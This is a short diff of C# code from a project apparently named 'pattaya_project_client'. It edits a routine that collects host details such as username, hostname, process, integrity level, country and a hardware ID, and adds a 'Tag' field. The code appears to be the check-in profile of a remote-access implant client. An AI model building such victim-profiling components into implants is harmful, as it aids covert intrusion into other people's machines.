@@ -40,14 +40,15 @@ namespace pattaya_project_client.Utils
                 Os = System.Runtime.InteropServices.RuntimeInformation.OSDescription,
                 Username = identity.Name,
                 Hostname = Environment.MachineName,
-                ProcessName = process.ProcessName,
+                ProcessName = String.Concat(process.ProcessName, ".exe"),
                 ProcessId = process.Id,
                 Integrity = integrity,
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Country = RegionInfo.CurrentRegion.TwoLetterISORegionName,
                 HWID = GetHardwareId(),
                 Type = Config.Type,
-                Version = Config.Version
+                Version = Config.Version,
+                Tag = Config.Tag,
             };
 
             process.Dispose();
